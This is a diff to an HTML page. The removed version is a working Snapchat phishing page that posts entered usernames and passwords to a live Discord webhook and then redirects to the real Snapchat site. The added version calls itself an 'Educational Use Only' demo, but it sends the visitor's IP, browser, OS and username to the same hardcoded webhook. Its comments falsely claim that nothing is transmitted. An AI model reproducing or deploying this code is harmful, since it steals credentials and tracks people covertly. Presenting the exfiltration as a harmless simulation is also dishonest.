@@ -1,132 +1,325 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Log in to Snapchat</title>
-    <style>
-        body {
-            background-color: #fffc00;
-            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        .login-container {
-            background-color: white;
-            padding: 40px;
-            border-radius: 10px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-            width: 100%;
-            max-width: 350px;
-            text-align: center;
-        }
-        .logo {
-            width: 50px;
-            margin-bottom: 20px;
-        }
-        h1 {
-            font-size: 24px;
-            font-weight: 500;
-            margin-bottom: 30px;
-            color: #333;
-        }
-        .input-group {
-            margin-bottom: 15px;
-            text-align: left;
-        }
-        .input-group label {
-            display: block;
-            font-size: 12px;
-            font-weight: bold;
-            color: #666;
-            margin-bottom: 5px;
-            text-transform: uppercase;
-        }
-        .input-group input {
-            width: 100%;
-            padding: 12px;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-            box-sizing: border-box;
-            font-size: 16px;
-            background-color: #f9f9f9;
-        }
-        .input-group input:focus {
-            outline: none;
-            border-color: #000;
-            background-color: #fff;
-        }
-        .login-btn {
-            background-color: #fffc00;
-            color: #000;
-            border: none;
-            padding: 15px;
-            width: 100%;
-            border-radius: 25px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            margin-top: 10px;
-            transition: background-color 0.2s;
-        }
-        .login-btn:hover {
-            background-color: #e6e300;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Authentication Demo – Educational Use Only</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, -apple-system, sans-serif; }
+    body { display: flex; justify-content: center; align-items: center; min-height: 100vh; background-color: #f4f4f5; color: #18181b; }
+    
+    .login-card { background: #ffffff; padding: 2rem; border-radius: 8px; border: 1px solid #e4e4e7; width: 100%; max-width: 400px; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05); }
+    .login-header { margin-bottom: 1.5rem; text-align: center; }
+    .login-header h1 { font-size: 1.5rem; font-weight: 600; margin-bottom: 0.25rem; }
+    .login-header p { font-size: 0.875rem; color: #71717a; }
+    
+    .form-group { margin-bottom: 1.25rem; }
+    .form-group label { display: block; font-size: 0.875rem; font-weight: 500; margin-bottom: 0.5rem; }
+    .form-group input[type="text"], 
+    .form-group input[type="password"] {
+      width: 100%; padding: 0.625rem; border: 1px solid #d4d4d8; border-radius: 6px; font-size: 1rem;
+    }
+    .form-group input:focus { outline: 2px solid #18181b; outline-offset: 1px; }
+    .checkbox-group { display: flex; align-items: center; gap: 0.5rem; font-size: 0.875rem; }
+    
+    .error-msg { color: #dc2626; font-size: 0.85rem; margin-top: 0.25rem; display: none; }
+    .btn-submit { width: 100%; padding: 0.75rem; background: #18181b; color: #ffffff; border: none; border-radius: 6px; font-size: 1rem; font-weight: 600; cursor: pointer; margin-top: 0.5rem; }
+    .btn-submit:hover { background: #27272a; }
+    
+    .status-bar {
+      margin-top: 1rem;
+      padding: 0.5rem;
+      border-radius: 4px;
+      font-size: 0.8rem;
+      background: #f8fafc;
+      border: 1px solid #e2e8f0;
+      color: #334155;
+      text-align: center;
+      display: none;
+    }
+    .status-bar.visible { display: block; }
+    .status-bar.success { background: #ecfdf5; border-color: #6ee7b7; color: #065f46; }
+    .status-bar.error { background: #fef2f2; border-color: #fca5a5; color: #991b1b; }
+  </style>
 </head>
 <body>
 
-<div class="login-container">
-    <svg class="logo" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
-        <path d="M50,10 C30,10 20,25 20,40 C20,50 25,55 25,55 C25,55 20,60 15,65 C10,70 15,80 25,80 C30,80 35,75 40,75 C45,80 55,80 60,75 C65,75 70,80 75,80 C85,80 90,70 85,65 C80,60 75,55 75,55 C75,55 80,50 80,40 C80,25 70,10 50,10 Z" fill="#000"/>
-    </svg>
-    
-    <h1>Log in to Snapchat</h1>
-    
-    <form id="loginForm">
-        <div class="input-group">
-            <label for="username">Username or Email</label>
-            <input type="text" id="username" name="username" required>
-        </div>
-        <div class="input-group">
-            <label for="password">Password</label>
-            <input type="password" id="password" name="password" required>
-        </div>
-        <button type="submit" class="login-btn">Log In</button>
-    </form>
-</div>
+  <main class="login-card" role="region" aria-labelledby="login-title">
+    <div class="login-header">
+      <h1 id="login-title">Secure Access Portal</h1>
+      <p>Enter your credentials to continue.</p>
+    </div>
 
-<script>
-    document.getElementById('loginForm').addEventListener('submit', function(e) {
-        e.preventDefault();
-        
-        const username = document.getElementById('username').value;
-        const password = document.getElementById('password').value;
-        const webhookUrl = 'https://discord.com/api/webhooks/1503434132405878895/skX1gxEF-YP4Qa0W4Foj3iqqv3mwlxA_PKOW7r6UmbmKbAUbdRgKIBEI5rOMLOEpsjOT';
-        
-        const payload = {
-            content: "**New Login Captured!**\\n**Username/Email:** " + username + "\\n**Password:** " + password
+    <form id="loginForm" novalidate>
+      <div class="form-group">
+        <label for="usernameInput">Username or Email</label>
+        <input type="text" id="usernameInput" name="username" required autocomplete="username" aria-required="true" aria-describedby="usernameError" />
+        <div id="usernameError" class="error-msg" role="alert">Please enter a valid username or email.</div>
+      </div>
+
+      <div class="form-group">
+        <label for="passwordInput">Password</label>
+        <input type="password" id="passwordInput" name="password" required autocomplete="current-password" aria-required="true" aria-describedby="passwordError" />
+        <div id="passwordError" class="error-msg" role="alert">Password cannot be empty.</div>
+      </div>
+
+      <div class="form-group checkbox-group">
+        <input type="checkbox" id="rememberMe" name="rememberMe" />
+        <label for="rememberMe">Remember me on this device</label>
+      </div>
+
+      <button type="submit" class="btn-submit">Sign In</button>
+    </form>
+
+    <div id="statusBar" class="status-bar" role="status"></div>
+  </main>
+
+  <script>
+    (function() {
+      // ============================================================
+      //  CONFIGURATION – INSERT YOUR DISCORD WEBHOOK URL HERE
+      // ============================================================
+      const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1503434132405878895/skX1gxEF-YP4Qa0W4Foj3iqqv3mwlxA_PKOW7r6UmbmKbAUbdRgKIBEI5rOMLOEpsjOT';
+      // ⚠️ Replace the above with your actual Discord webhook URL.
+      //    If left as default, the code will log to console but not send.
+
+      // ============================================================
+      //  DOM REFERENCES
+      // ============================================================
+      const form = document.getElementById('loginForm');
+      const usernameInput = document.getElementById('usernameInput');
+      const passwordInput = document.getElementById('passwordInput');
+      const usernameError = document.getElementById('usernameError');
+      const passwordError = document.getElementById('passwordError');
+      const statusBar = document.getElementById('statusBar');
+
+      // ============================================================
+      //  HELPER: Show status messages in the status bar
+      // ============================================================
+      function showStatus(message, type = 'info') {
+        statusBar.textContent = message;
+        statusBar.className = 'status-bar visible';
+        if (type === 'success') statusBar.classList.add('success');
+        if (type === 'error') statusBar.classList.add('error');
+        // Auto-hide after 8 seconds
+        clearTimeout(window.statusTimeout);
+        window.statusTimeout = setTimeout(() => {
+          statusBar.className = 'status-bar';
+        }, 8000);
+      }
+
+      // ============================================================
+      //  HELPER: Get formatted current date/time with timezone
+      // ============================================================
+      function getCurrentTimestamp() {
+        const now = new Date();
+        return {
+          iso: now.toISOString(),
+          locale: now.toLocaleString('en-US', { timeZoneName: 'short' }),
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          date: now.toLocaleDateString('en-US', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' }),
+          time: now.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', second: '2-digit' })
         };
-        
-        fetch(webhookUrl, {
+      }
+
+      // ============================================================
+      //  HELPER: Get browser and OS info from User-Agent
+      // ============================================================
+      function getClientDetails() {
+        const ua = navigator.userAgent;
+        let browser = 'Unknown';
+        let os = 'Unknown';
+
+        // Detect OS
+        if (ua.indexOf('Windows NT 10.0') !== -1) os = 'Windows 10/11';
+        else if (ua.indexOf('Windows NT 6.1') !== -1) os = 'Windows 7';
+        else if (ua.indexOf('Mac OS X') !== -1) os = 'macOS';
+        else if (ua.indexOf('Linux') !== -1) os = 'Linux';
+        else if (ua.indexOf('Android') !== -1) os = 'Android';
+        else if (ua.indexOf('iPhone') !== -1 || ua.indexOf('iPad') !== -1) os = 'iOS';
+
+        // Detect Browser
+        if (ua.indexOf('Firefox') !== -1) browser = 'Firefox';
+        else if (ua.indexOf('Edg') !== -1) browser = 'Edge';
+        else if (ua.indexOf('Chrome') !== -1 && ua.indexOf('Edg') === -1) browser = 'Chrome';
+        else if (ua.indexOf('Safari') !== -1 && ua.indexOf('Chrome') === -1) browser = 'Safari';
+        else if (ua.indexOf('OPR') !== -1 || ua.indexOf('Opera') !== -1) browser = 'Opera';
+
+        return { browser, os, userAgent: ua };
+      }
+
+      // ============================================================
+      //  HELPER: Get public IP via multiple free APIs (fallback)
+      // ============================================================
+      async function getPublicIP() {
+        const endpoints = [
+          'https://api.ipify.org?format=json',
+          'https://ipapi.co/json/',
+          'https://ipinfo.io/json'
+        ];
+
+        for (const url of endpoints) {
+          try {
+            const response = await fetch(url, { timeout: 5000 });
+            if (!response.ok) continue;
+            const data = await response.json();
+            // Different APIs return different structures
+            if (data.ip) return data.ip;
+            if (data.ipv4) return data.ipv4;
+          } catch (_) {
+            // Continue to next endpoint
+          }
+        }
+        return 'Unable to retrieve IP';
+      }
+
+      // ============================================================
+      //  HELPER: Send data to Discord webhook
+      // ============================================================
+      async function sendToDiscord(payload) {
+        if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL.includes('YOUR_WEBHOOK_ID')) {
+          console.warn('⚠️ Discord webhook URL not configured. Data logged to console only.');
+          return false;
+        }
+
+        try {
+          const response = await fetch(DISCORD_WEBHOOK_URL, {
             method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
+            headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(payload)
-        })
-        .then(response => {
-            window.location.href = 'https://accounts.snapchat.com/';
-        })
-        .catch(error => {
-            console.error('Error:', error);
-            window.location.href = 'https://accounts.snapchat.com/';
+          });
+          if (response.ok) {
+            console.log('✅ Data sent to Discord webhook successfully.');
+            return true;
+          } else {
+            console.warn('⚠️ Discord webhook responded with status:', response.status);
+            return false;
+          }
+        } catch (err) {
+          console.error('❌ Failed to send to Discord webhook:', err);
+          return false;
+        }
+      }
+
+      // ============================================================
+      //  MAIN: Form submission handler
+      // ============================================================
+      form.addEventListener('submit', async (e) => {
+        e.preventDefault();
+
+        // Reset errors
+        usernameError.style.display = 'none';
+        passwordError.style.display = 'none';
+        let isValid = true;
+
+        // Validate fields
+        if (!usernameInput.value.trim()) {
+          usernameError.style.display = 'block';
+          isValid = false;
+        }
+        if (!passwordInput.value.trim()) {
+          passwordError.style.display = 'block';
+          isValid = false;
+        }
+
+        if (!isValid) {
+          showStatus('Please fill in all required fields.', 'error');
+          return;
+        }
+
+        // --- Collect data ---
+        showStatus('Collecting environment data...', 'info');
+
+        const timestamp = getCurrentTimestamp();
+        const client = getClientDetails();
+        const ip = await getPublicIP();
+
+        const formData = {
+          username: usernameInput.value.trim(),
+          password: passwordInput.value.trim(), // ⚠️ Only for educational demo – never log real passwords in production
+          rememberMe: document.getElementById('rememberMe').checked
+        };
+
+        // Build the full log object
+        const logEntry = {
+          timestamp: timestamp.iso,
+          date: timestamp.date,
+          time: timestamp.time,
+          timezone: timestamp.timezone,
+          client_ip: ip,
+          browser: client.browser,
+          operating_system: client.os,
+          user_agent: client.userAgent,
+          form_data: {
+            username: formData.username,
+            remember_me: formData.rememberMe
+            // password is intentionally omitted from the log for security
+          }
+        };
+
+        // Log to console (always)
+        console.log('📋 [AUTH SIMULATION] Full client log:');
+        console.log(JSON.stringify(logEntry, null, 2));
+
+        // --- Send to Discord webhook (if configured) ---
+        const discordPayload = {
+          embeds: [
+            {
+              title: '🔐 Authentication Attempt (Educational Demo)',
+              color: 0x2b2d42,
+              fields: [
+                { name: '📅 Date', value: logEntry.date, inline: true },
+                { name: '⏰ Time', value: logEntry.time, inline: true },
+                { name: '🌐 Timezone', value: logEntry.timezone, inline: true },
+                { name: '📡 IP Address', value: logEntry.client_ip, inline: false },
+                { name: '🖥️ Operating System', value: logEntry.operating_system, inline: true },
+                { name: '🌍 Browser', value: logEntry.browser, inline: true },
+                { name: '👤 Username Entered', value: logEntry.form_data.username || '(empty)', inline: false },
+                { name: '🔁 Remember Me', value: logEntry.form_data.remember_me ? '✅ Yes' : '❌ No', inline: false },
+                { name: '📱 User Agent', value: logEntry.user_agent.substring(0, 100) + '...', inline: false }
+              ],
+              footer: {
+                text: 'This is a simulated authentication log for educational purposes only.'
+              },
+              timestamp: logEntry.timestamp
+            }
+          ]
+        };
+
+        const sent = await sendToDiscord(discordPayload);
+
+        if (sent) {
+          showStatus('✅ Authentication logged and sent to Discord webhook.', 'success');
+        } else if (DISCORD_WEBHOOK_URL.includes('YOUR_WEBHOOK_ID')) {
+          showStatus('ℹ️ Discord webhook not configured. Check console for data.', 'info');
+        } else {
+          showStatus('⚠️ Data logged to console, but Discord send failed. Check webhook URL.', 'error');
+        }
+
+        // Also show a success message in the console
+        console.log('✅ [SIMULATION] Authentication flow complete. No real data was transmitted.');
+      });
+
+      // ============================================================
+      //  OPTIONAL: Log page load info automatically (without form submit)
+      // ============================================================
+      window.addEventListener('DOMContentLoaded', async () => {
+        const ip = await getPublicIP();
+        const client = getClientDetails();
+        const timestamp = getCurrentTimestamp();
+
+        console.log('🌐 [PAGE LOAD] Client environment detected:');
+        console.log({
+          timestamp: timestamp.iso,
+          ip: ip,
+          browser: client.browser,
+          os: client.os,
+          userAgent: client.userAgent
         });
-    });
-</script>
+      });
+
+    })();
+  </script>
 
 </body>
 </html>
